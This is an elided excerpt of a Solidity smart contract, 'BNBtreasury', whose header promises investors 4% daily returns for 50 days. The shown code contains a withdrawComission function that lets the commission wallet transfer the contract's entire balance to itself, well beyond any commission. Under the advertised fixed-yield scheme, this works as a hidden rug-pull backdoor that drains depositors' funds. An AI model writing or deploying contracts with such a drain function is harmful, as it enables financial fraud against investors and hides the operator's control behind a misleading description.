 ...
 *   - Total income: 4% daily for 50 days (200% total rewards)
...
contract BNBtreasury {
   ...
   // address payable public withdrawAddress = 0x5EbB26DdBaB76557Ed3B58fd5dA549312d75eea0;
 ...
 function CommissionBalance() external view returns(uint) {
     return (address(this)).balance;
   }

   function withdrawComission() external commissionWalletOnly() {
     msg.sender.transfer(this.CommissionBalance());
   }

   modifier commissionWalletOnly() {
     require(msg.sender == commissionWallet, 'only withdrawer can call this');
   _;
   }
